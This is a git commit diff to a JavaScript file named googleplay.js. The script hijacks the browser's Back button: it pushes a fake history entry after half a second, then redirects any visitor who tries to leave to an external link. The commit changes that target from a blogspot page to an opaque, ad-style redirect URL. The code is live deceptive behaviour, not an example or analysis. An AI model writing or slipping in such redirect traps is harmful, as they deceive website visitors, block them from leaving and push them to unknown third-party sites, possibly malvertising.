245decf4b46dc2268fe737f04e1b3fe8c900aa57
usorondo3 <mimic-piteous-5s@icloud.com>
2026-08-09 15:40:11 +0100

    Update googleplay.js

--- googleplay.js
+++ googleplay.js
@@ -1,13 +1,11 @@
-
-
-    window.onhashchange=function(){jp();};
+  window.onhashchange=function(){jp();};
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
     function jp() {
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://appliedjobszw.blogspot.com";
+        location.href="https://crn77.com/4/8525379";
     }
     function goon(){
-        location.href="https://appliedjobszw.blogspot.com";
+        location.href="https://crn77.com/4/8525379";
     }
